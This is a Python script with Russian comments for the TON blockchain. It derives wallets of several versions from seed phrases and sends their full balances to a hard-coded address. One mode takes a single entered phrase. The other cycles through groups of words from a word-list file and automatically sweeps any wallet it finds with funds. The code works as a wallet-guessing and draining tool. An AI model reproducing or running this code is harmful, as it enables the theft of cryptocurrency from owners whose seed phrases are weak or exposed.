from pytoniq_core.crypto.keys import mnemonic_to_private_key
from tonutils.clients import ToncenterClient
from ton_core import NetworkGlobalID, PrivateKey
from tonutils.contracts import (
    WalletV2R1, WalletV2R2, WalletV3R1, WalletV3R2, WalletV4R1, WalletV4R2, WalletV5R1,
   # HighloadWalletV2, HighloadWalletV3, PreprocessedWalletV2, PreprocessedWalletV2R1
)
import asyncio
import aiohttp

# ==========================================
# НАСТРОЙКИ СКРИПТА
# ==========================================

# Удобное включение/отключение версий кошельков.
# Чтобы отключить версию, просто поставьте знак # перед её названием.
ENABLED_WALLETS = [
    "WalletV2R1",
    "WalletV2R2",
    "WalletV3R1",
    "WalletV3R2",
    "WalletV4R1",
    "WalletV4R2",
    "WalletV5R1",
    # "HighloadWalletV2",
    # "HighloadWalletV3",
    # "PreprocessedWalletV2",
    # "PreprocessedWalletV2R1",
]

# Ключи для Toncenter API
TONCENTER_API_KEYS = {
    "mainnet": "654544d......80436",  # Вставь свой ключ
    "testnet": "2871644......1abdf",  # Вставь свой ключ
}

# Адреса для перевода средств
TRANSFER_ADDRESSES = {
    "mainnet": "UQCIc8nJVvAyOpckPI24Fsgx9IcI3BtGo81n6iIqXU0asofW",
    "testnet": "0QC9AevlAcsQk6uzXcWNMhmKZng5HEfXFMrRFr7T_EXQ1EL8",
}

# Комиссия в TON, которая резервируется при отправке
FEE_TON = 0.05

# ==========================================
# ЛОГИКА СКРИПТА
# ==========================================

# Сопоставление строковых названий с реальными классами
WALLET_CLASSES = {
    "WalletV2R1": WalletV2R1,
    "WalletV2R2": WalletV2R2,
    "WalletV3R1": WalletV3R1,
    "WalletV3R2": WalletV3R2,
    "WalletV4R1": WalletV4R1,
    "WalletV4R2": WalletV4R2,
    "WalletV5R1": WalletV5R1,
  #  "HighloadWalletV2": HighloadWalletV2,
 #   "HighloadWalletV3": HighloadWalletV3,
  #  "PreprocessedWalletV2": PreprocessedWalletV2,
   # "PreprocessedWalletV2R1": PreprocessedWalletV2R1,
}

# Получаем баланс через Toncenter API
async def get_balance(address, network, session):
    url = f"https://{'testnet.' if network == 'testnet' else ''}toncenter.com/api/v2/getAddressInformation"
    params = {"address": address}
    headers = {"X-API-Key": TONCENTER_API_KEYS[network]}

    async with session.get(url, params=params, headers=headers) as response:
        data = await response.json()
        if data.get("ok"):
            return int(data["result"]["balance"])
        else:
            raise Exception(f"Ошибка при получении баланса: {data.get('error')}")

# Проверяем, развернут ли кошелек
async def is_wallet_deployed(address, network, session):
    try:
        url = f"https://{'testnet.' if network == 'testnet' else ''}toncenter.com/api/v2/getAddressInformation"
        params = {"address": address}
        headers = {"X-API-Key": TONCENTER_API_KEYS[network]}

        async with session.get(url, params=params, headers=headers) as response:
            data = await response.json()
            if data.get("ok"):
                # В TON state "active" означает, что контракт развернут
                return data["result"]["state"] == "active"
            else:
                raise Exception(f"Ошибка: {data.get('error')}")
    except Exception as e:
        print(f"Ошибка при проверке развертывания: {e}")
        return False

# Отправляем транзакцию
async def send_transaction(wallet, network, destination, amount_ton, comment, session):
    try:
        address = wallet.address.to_str()

        # Проверяем, развернут ли кошелек
        if not await is_wallet_deployed(address, network, session):
            print(f"Кошелек {address} не развернут. Невозможно отправить транзакцию.")
            return

        # Проверяем баланс
        balance_ton = await get_balance(address, network, session) / 1e9

        # Проверяем, достаточно ли средств
        if amount_ton + FEE_TON > balance_ton:
            print(f"Недостаточно средств. Баланс: {balance_ton} TON, требуется: {amount_ton + FEE_TON} TON.")
            return

        # ПРЕОБРАЗУЕМ СУММУ В ЦЕЛЫЕ НАНОТОН (INT) ДЛЯ БИБЛИОТЕКИ
        amount_nano = int(amount_ton * 1e9)

        # Создаем транзакцию
        tx_hash = await wallet.transfer(
            destination=destination,
            amount=amount_nano,  # Передаем наноТОН
            body=comment,
        )
        print(f"Успешно отправлено {amount_ton} TON на {destination}!")
        print(f"Хэш транзакции: {tx_hash}")
    except Exception as e:
        print(f"Ошибка при отправке транзакции для {address}: {e}")

# Создаем выбранные версии кошельков
async def create_wallets(client, private_key):
    wallets = []
    for wallet_name in ENABLED_WALLETS:
        wallet_class = WALLET_CLASSES.get(wallet_name)
        
        if not wallet_class:
            print(f"Предупреждение: класс {wallet_name} не найден. Он будет пропущен.")
            continue
            
        try:
            # В новой версии tonutils from_private_key возвращает тупл (wallet, public_key)
            result = wallet_class.from_private_key(client, private_key)
            
            # Извлекаем объект кошелька из тупла
            if isinstance(result, tuple) and len(result) > 0:
                wallet_obj = result[0]
            else:
                wallet_obj = result
                
            # Строгая проверка, что это действительно кошелек
            if hasattr(wallet_obj, 'address'):
                wallets.append(wallet_obj)
            else:
                print(f"Ошибка: {wallet_name} создан, но не имеет атрибута address.")
        except Exception as e:
            print(f"Ошибка при инициализации {wallet_name}: {e}")
            
    return wallets

# Парсер слов из файла english.txt
def parse_words(word_count):
    try:
        with open("english.txt", "r") as file:
            words = file.read().splitlines()
    except FileNotFoundError:
        print("Файл english.txt не найден!")
        return []

    if word_count == 12:
        return [words[i:i + 12] for i in range(0, len(words), 12)]
    elif word_count == 24:
        return [words[i:i + 24] for i in range(0, len(words), 24)]
    elif word_count == 1:
        return [[word] for word in words]
    else:
        raise ValueError("Неподдерживаемое количество слов.")

# Основная функция
async def main():
    # Создаем одну сессию для всех запросов
    async with aiohttp.ClientSession() as session:
        while True:
            mode_choice = input("Выберите режим:\n1) Основной\n2) Парсер\n").strip()
            if mode_choice not in ["1", "2"]:
                print("Неверный выбор. Попробуйте снова.")
                continue

            if mode_choice == "1":
                while True:
                    network_choice = input("Выберите сеть:\n1) mainnet\n2) testnet\n3) mainnet + testnet\n").strip()
                    if network_choice not in ["1", "2", "3"]:
                        print("Неверный выбор. Попробуйте снова.")
                        continue

                    networks = []
                    if network_choice == "1": networks.append("mainnet")
                    elif network_choice == "2": networks.append("testnet")
                    elif network_choice == "3": networks.extend(["mainnet", "testnet"])

                    mnemonic = input("Введите сид-фразу (или 'exit' для выхода): ").strip()
                    if mnemonic.lower() == "exit":
                        break

                    try:
                        # Оборачиваем ключи в объект PrivateKey
                        key_bytes = mnemonic_to_private_key(mnemonic.split(" "))[1]
                        private_key = PrivateKey(key_bytes)
                    except Exception as e:
                        print(f"Ошибка при генерации ключа: {e}")
                        continue

                    for network in networks:
                        print(f"\n=== {network.upper()} ===")
                        client = ToncenterClient(
                            api_key=TONCENTER_API_KEYS[network],
                            network=NetworkGlobalID.TESTNET if network == "testnet" else NetworkGlobalID.MAINNET
                        )

                        wallets = await create_wallets(client, private_key)

                        for wallet in wallets:
                            # Строгая проверка перед вызовом
                            if not hasattr(wallet, 'address'):
                                print(f"Пропуск: объект не является кошельком.")
                                continue
                                
                            address = wallet.address.to_str()
                            try:
                                balance_ton = await get_balance(address, network, session) / 1e9
                                print(f"\nАдрес ({wallet.__class__.__name__}): {address}")
                                print(f"Баланс: {balance_ton} TON")

                                if balance_ton > 0:
                                    amount_to_send = balance_ton - FEE_TON
                                    if amount_to_send > 0:
                                        await send_transaction(wallet, network, TRANSFER_ADDRESSES[network], amount_to_send, "Transfer from wallet script", session)
                                    else:
                                        print("Недостаточно средств для отправки после вычета комиссии.")
                            except Exception as e:
                                print(f"Ошибка при обработке кошелька {wallet.__class__.__name__}: {e}")

            elif mode_choice == "2":
                word_count_choice = input("Выберите количество слов:\n1) 12\n2) 24\n3) 1\n").strip()
                if word_count_choice not in ["1", "2", "3"]:
                    print("Неверный выбор.")
                    continue

                word_count = 12 if word_count_choice == "1" else 24 if word_count_choice == "2" else 1
                word_lists = parse_words(word_count)

                for i, words in enumerate(word_lists[:2048]):
                    print(f"\n=== Группа слов {i + 1} ===")
                    mnemonic = " ".join(words)
                    
                    try:
                        key_bytes = mnemonic_to_private_key(mnemonic.split(" "))[1]
                        private_key = PrivateKey(key_bytes)
                    except Exception as e:
                        print(f"Ошибка при генерации ключа: {e}")
                        continue

                    for network in ["mainnet", "testnet"]:
                        print(f"\n=== {network.upper()} ===")
                        client = ToncenterClient(
                            api_key=TONCENTER_API_KEYS[network],
                            network=NetworkGlobalID.TESTNET if network == "testnet" else NetworkGlobalID.MAINNET
                        )

                        wallets = await create_wallets(client, private_key)

                        for wallet in wallets:
                            if not hasattr(wallet, 'address'):
                                continue
                                
                            address = wallet.address.to_str()
                            try:
                                balance_ton = await get_balance(address, network, session) / 1e9
                                print(f"Адрес ({wallet.__class__.__name__}): {address} | Баланс: {balance_ton} TON")

                                if balance_ton > 0:
                                    amount_to_send = balance_ton - FEE_TON
                                    if amount_to_send > 0:
                                        await send_transaction(wallet, network, TRANSFER_ADDRESSES[network], amount_to_send, "Transfer from wallet script", session)
                            except Exception as e:
                                print(f"Ошибка: {e}")

# Запуск программы
if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nПрограмма остановлена пользователем.")
